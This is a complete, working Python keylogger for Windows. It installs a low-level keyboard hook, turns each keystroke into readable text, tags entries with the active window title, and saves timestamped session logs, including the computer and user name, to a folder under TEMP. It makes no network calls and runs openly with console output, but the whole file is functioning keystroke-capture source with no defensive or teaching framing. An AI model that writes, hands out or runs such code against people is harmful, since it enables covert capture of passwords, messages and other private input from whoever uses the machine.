import os
import sys
import json
import threading
import time
from datetime import datetime

# --- Windows API ---
import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)

# Windows constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

# Key state constants
VK_SHIFT = 0x10
VK_CAPITAL = 0x14
VK_CONTROL = 0x11
VK_MENU = 0x12  # ALT

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ('vkCode', wintypes.DWORD),
        ('scanCode', wintypes.DWORD),
        ('flags', wintypes.DWORD),
        ('time', wintypes.DWORD),
        ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong)),
    ]

# ===== CONFIGURATION =====
DEBUG_MODE = True
OUTPUT_DIR = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'keylogs')

# Create output directory
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ===== VIRTUAL KEY CODE MAPPING =====

# Special keys and their readable names
SPECIAL_KEYS = {
    0x08: '[BACKSPACE]',
    0x09: '[TAB]',
    0x0D: '[ENTER]',
    0x13: '[PAUSE]',
    0x14: '[CAPS]',
    0x1B: '[ESC]',
    0x20: ' ',  # SPACE
    0x21: '[PAGE UP]',
    0x22: '[PAGE DOWN]',
    0x23: '[END]',
    0x24: '[HOME]',
    0x25: '[LEFT]',
    0x26: '[UP]',
    0x27: '[RIGHT]',
    0x28: '[DOWN]',
    0x2D: '[INSERT]',
    0x2E: '[DELETE]',
    0x5B: '[WIN LEFT]',
    0x5C: '[WIN RIGHT]',
    0x5D: '[MENU]',
    0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]', 0x73: '[F4]',
    0x74: '[F5]', 0x75: '[F6]', 0x76: '[F7]', 0x77: '[F8]',
    0x78: '[F9]', 0x79: '[F10]', 0x7A: '[F11]', 0x7B: '[F12]',
    0x90: '[NUM LOCK]',
    0x91: '[SCROLL LOCK]',
    0xA0: '[LSHIFT]', 0xA1: '[RSHIFT]',
    0xA2: '[LCTRL]', 0xA3: '[RCTRL]',
    0xA4: '[LALT]', 0xA5: '[RALT]',
    # Numpad
    0x60: '0', 0x61: '1', 0x62: '2', 0x63: '3', 0x64: '4',
    0x65: '5', 0x66: '6', 0x67: '7', 0x68: '8', 0x69: '9',
    0x6A: '*', 0x6B: '+', 0x6D: '-', 0x6E: '.', 0x6F: '/',
}

# Shift mapping for US keyboard
SHIFT_MAP = {
    '`': '~', '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
    '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
    ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
}

# ===== HELPER FUNCTIONS =====

def log(message):
    """Print debug message with timestamp"""
    if DEBUG_MODE:
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {message}", flush=True)

def get_active_window_title():
    """Get the title of the currently active window"""
    try:
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return "Unknown"
        
        length = user32.GetWindowTextLengthW(hwnd) + 1
        if length > 512:
            length = 512
        
        buffer = ctypes.create_unicode_buffer(length)
        user32.GetWindowTextW(hwnd, buffer, length)
        return buffer.value
    except:
        return "Unknown"

def is_key_pressed(vk_code):
    """Check if a key is currently pressed"""
    return (ctypes.windll.user32.GetAsyncKeyState(vk_code) & 0x8000) != 0

# ===== KEYLOGGER =====

class SimpleKeylogger:
    """Simple keylogger that captures all keystrokes with readable output"""
    
    def __init__(self):
        self.hook_id = None
        self._callback = None
        self.current_window = ""
        self.buffer = []
        self.last_save_time = time.time()
        self.save_interval = 30  # Save every 30 seconds
        self.running = True
        
        # Session log file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.log_file = os.path.join(OUTPUT_DIR, f'keylog_{timestamp}.txt')
        
        # Initialize log file with header
        self.write_header()
    
    def write_header(self):
        """Write header to log file"""
        with open(self.log_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"KEYLOGGER SESSION START\n")
            f.write(f"Computer: {os.environ.get('COMPUTERNAME', 'Unknown')}\n")
            f.write(f"User: {os.environ.get('USERNAME', 'Unknown')}\n")
            f.write(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
    
    def save_buffer(self):
        """Save current buffer to file"""
        if not self.buffer:
            return
        
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write('\n'.join(self.buffer) + '\n')
            
            self.buffer = []
            self.last_save_time = time.time()
            
            # Log file size periodically
            size = os.path.getsize(self.log_file)
            if size > 1024 * 1024:  # 1 MB
                log(f"📄 Log file size: {size / 1024:.1f} KB")
                
        except Exception as e:
            log(f"❌ Save error: {e}")
    
    def get_readable_key(self, vk_code):
        """Convert virtual key code to readable string"""
        
        # Check for special keys first
        if vk_code in SPECIAL_KEYS:
            return SPECIAL_KEYS[vk_code]
        
        # Check for letter keys (A-Z = 0x41-0x5A)
        if 0x41 <= vk_code <= 0x5A:
            char = chr(vk_code)
            
            # Determine case based on Shift and Caps Lock
            shift = is_key_pressed(VK_SHIFT)
            caps = is_key_pressed(VK_CAPITAL)
            
            # XOR: if both are true or both false, lowercase
            # If exactly one is true, uppercase
            upper_case = shift != caps
            
            return char.upper() if upper_case else char.lower()
        
        # Check for number keys and symbols (0x30-0x39 for 0-9, etc.)
        if 0x30 <= vk_code <= 0x39:  # 0-9
            char = chr(vk_code)
            if is_key_pressed(VK_SHIFT):
                return SHIFT_MAP.get(char, char)
            return char
        
        # Check for common symbol keys
        symbol_keys = {
            0xBA: ';', 0xBB: '=', 0xBC: ',', 0xBD: '-',
            0xBE: '.', 0xBF: '/', 0xC0: '`', 0xDB: '[',
            0xDC: '\\', 0xDD: ']', 0xDE: "'",
        }
        
        if vk_code in symbol_keys:
            char = symbol_keys[vk_code]
            if is_key_pressed(VK_SHIFT):
                return SHIFT_MAP.get(char, char)
            return char
        
        # Unknown key
        return f'[KEY:{hex(vk_code)}]'
    
    def format_window_change(self, new_window):
        """Format window change entry"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        return f"\n[{timestamp}] === WINDOW: {new_window} ===\n"
    
    def format_key_entry(self, keys, window):
        """Format key entries with timestamp and window info"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        return f"[{timestamp}][{window[:50]}] {''.join(keys)}"
    
    def hook_callback(self, nCode, wParam, lParam):
        """Windows hook callback"""
        if nCode < 0 or not self.running:
            return ctypes.windll.user32.CallNextHookEx(0, nCode, wParam, lParam)
        
        try:
            if wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN:
                kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                
                # Get readable key representation
                key = self.get_readable_key(kb.vkCode)
                
                # Check for window change
                current = get_active_window_title()
                if current != self.current_window:
                    self.buffer.append(self.format_window_change(current))
                    self.current_window = current
                
                # Create log entry
                entry = f"[{datetime.now().strftime('%H:%M:%S')}] {key}"
                self.buffer.append(entry)
                
                # Print to console if debug mode
                if DEBUG_MODE:
                    window_short = current[:30] if current else "Unknown"
                    print(f"[{window_short}] {key}", flush=True)
                
                # Auto-save periodically
                if time.time() - self.last_save_time >= self.save_interval:
                    self.save_buffer()
                
        except Exception as e:
            # Silent fail for performance
            pass
        
        return ctypes.windll.user32.CallNextHookEx(0, nCode, wParam, lParam)
    
    def start(self):
        """Start the keylogger"""
        log("🟢 Starting keylogger...")
        log(f"📁 Log file: {self.log_file}")
        
        # Get initial window
        self.current_window = get_active_window_title()
        self.buffer.append(self.format_window_change(self.current_window))
        
        # Get current thread ID
        thread_id = kernel32.GetCurrentThreadId()
        
        # Initialize message queue
        msg = wintypes.MSG()
        ctypes.windll.user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1)
        
        # Create callback
        HOOKPROC = ctypes.WINFUNCTYPE(
            ctypes.c_longlong,
            ctypes.c_int,
            wintypes.WPARAM,
            wintypes.LPARAM
        )
        
        self._callback = HOOKPROC(self.hook_callback)
        
        # Set hook
        self.hook_id = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            self._callback,
            kernel32.GetModuleHandleW(None),
            0
        )
        
        if not self.hook_id:
            error = kernel32.GetLastError()
            log(f"❌ Failed to set hook! Error: {error}")
            return False
        
        log("✅ Keylogger active!")
        
        # Message loop
        while self.running:
            result = ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            
            if result == 0:  # WM_QUIT
                log("Received WM_QUIT")
                break
            elif result == -1:
                time.sleep(0.01)
                continue
            
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
        
        # Final save
        self.save_buffer()
        self.cleanup()
        return True
    
    def cleanup(self):
        """Clean up resources"""
        if self.hook_id:
            ctypes.windll.user32.UnhookWindowsHookEx(self.hook_id)
            self.hook_id = None
        
        # Write footer
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write("\n" + "=" * 60 + "\n")
                f.write(f"SESSION END: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n")
        except:
            pass
        
        log("🔴 Keylogger stopped")
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        if self.hook_id:
            thread_id = kernel32.GetCurrentThreadId()
            ctypes.windll.user32.PostThreadMessageW(thread_id, 0x0012, 0, 0)

# ===== MAIN =====

def main():
    print("\n" + "=" * 50)
    print("🔑 SIMPLE KEYLOGGER")
    print("=" * 50)
    
    # System info
    computer = os.environ.get('COMPUTERNAME', 'Unknown')
    username = os.environ.get('USERNAME', 'Unknown')
    
    log(f"💻 System: {username}@{computer}")
    log(f"📁 Output: {OUTPUT_DIR}")
    log(f"🐍 Python: {sys.version.split()[0]}")
    log("-" * 50)
    log("Press Ctrl+C to stop")
    print()
    
    # Test output directory
    try:
        test_file = os.path.join(OUTPUT_DIR, '.test')
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        log("✅ Output directory ready")
    except Exception as e:
        log(f"❌ Cannot write to {OUTPUT_DIR}: {e}")
        return
    
    # Create and start keylogger
    keylogger = SimpleKeylogger()
    
    # Run in separate thread
    thread = threading.Thread(target=keylogger.start, daemon=False)
    thread.start()
    
    # Wait for initialization
    time.sleep(0.5)
    
    if not keylogger.hook_id:
        log("❌ Failed to initialize keylogger")
        return
    
    try:
        # Main loop - monitor and provide status updates
        while thread.is_alive():
            time.sleep(10)
            
            # Show status
            buffer_size = len(keylogger.buffer)
            file_size = os.path.getsize(keylogger.log_file) if os.path.exists(keylogger.log_file) else 0
            
            if DEBUG_MODE:
                log(f"💚 Active | Buffer: {buffer_size} entries | File: {file_size/1024:.1f} KB")
            
    except KeyboardInterrupt:
        log("\n🛑 Stopping keylogger...")
    except Exception as e:
        log(f"❌ Error: {e}")
    finally:
        keylogger.stop()
        
        # Wait for thread to finish
        thread.join(timeout=2)
        
        log("✅ Done")
        log(f"📄 Log saved to: {keylogger.log_file}")
        
        # Show recent log entries
        try:
            with open(keylogger.log_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                recent = lines[-10:] if len(lines) > 10 else lines
                log("\n📋 Last entries:")
                for line in recent:
                    log(f"   {line.rstrip()}")
        except:
            pass

if __name__ == '__main__':
    main()